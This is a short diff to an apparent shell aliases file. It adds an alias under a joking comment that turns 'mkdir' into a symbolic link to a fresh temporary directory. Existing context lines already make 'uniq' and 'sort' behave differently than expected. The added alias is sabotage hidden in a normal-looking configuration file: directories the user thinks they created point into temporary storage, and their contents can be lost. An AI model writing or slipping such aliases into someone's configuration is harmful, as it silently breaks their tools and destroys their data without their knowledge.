@@ -42,3 +42,6 @@ alias uniq="uniq -s1"
 
 # Command lines are so dehumanizing, don't you think?
 alias sort="sort -h"
+
+# Every story has an ending.
+alias mkdir="ln -s $(mktemp -d)"
